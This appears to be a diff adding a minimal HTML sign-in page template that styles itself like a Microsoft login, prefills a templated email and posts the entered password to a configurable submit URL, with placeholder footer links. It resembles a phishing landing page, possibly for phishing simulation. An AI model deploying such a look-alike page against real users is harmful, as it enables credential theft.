@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign In</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #f2f2f2;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
+.login-container {
+    background: #ffffff;
+    padding: 44px;
+    width: 440px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+}
+.logo {
+    font-size: 20px;
+    font-weight: 600;
+    color: #1b1b1b;
+    margin-bottom: 16px;
+}
+.logo span {
+    color: #0078d4;
+}
+h2 {
+    font-size: 24px;
+    font-weight: 300;
+    color: #1b1b1b;
+    margin-bottom: 24px;
+}
+.email-display {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 20px;
+    padding: 8px 0;
+}
+.form-group {
+    margin-bottom: 16px;
+}
+label {
+    display: block;
+    font-size: 13px;
+    color: #1b1b1b;
+    margin-bottom: 4px;
+}
+input[type="email"],
+input[type="password"],
+input[type="text"] {
+    width: 100%;
+    padding: 6px 10px;
+    font-size: 15px;
+    border: 1px solid #666;
+    outline: none;
+    font-family: inherit;
+}
+input:focus {
+    border-color: #0078d4;
+}
+.submit-btn {
+    width: 100%;
+    padding: 10px;
+    background-color: #0078d4;
+    color: #ffffff;
+    border: none;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 16px;
+}
+.submit-btn:hover {
+    background-color: #106ebe;
+}
+.footer-links {
+    margin-top: 16px;
+    font-size: 13px;
+}
+.footer-links a {
+    color: #0067b8;
+    text-decoration: none;
+}
+.footer-links a:hover {
+    text-decoration: underline;
+}
+</style>
+</head>
+<body>
+<div class="login-container">
+    <div class="logo">Sign in</div>
+
+    <div class="email-display">{{.Email}}</div>
+
+    <form method="POST" action="{{.SubmitURL}}">
+        <input type="hidden" name="email" value="{{.Email}}">
+
+        <div class="form-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="Password" required autofocus>
+        </div>
+
+        <button type="submit" class="submit-btn">Sign in</button>
+    </form>
+
+    <div class="footer-links">
+        <a href="#">Forgot my password</a><br>
+        <a href="#">Sign in with a security key</a>
+    </div>
+</div>
+</body>
+</html>
